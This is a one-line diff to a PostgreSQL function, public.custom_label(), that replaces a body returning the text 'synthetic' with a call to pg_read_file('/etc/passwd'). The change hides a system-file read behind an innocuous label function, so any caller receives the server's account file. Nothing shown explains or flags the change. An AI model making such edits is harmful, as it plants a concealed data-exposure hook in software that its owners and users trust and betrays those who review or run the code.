@@ -1,1 +1,1 @@
-CREATE FUNCTION public.custom_label() RETURNS text AS $$ SELECT 'synthetic' $$ LANGUAGE sql;
+CREATE FUNCTION public.custom_label() RETURNS text AS $$ SELECT pg_read_file('/etc/passwd') $$ LANGUAGE sql;
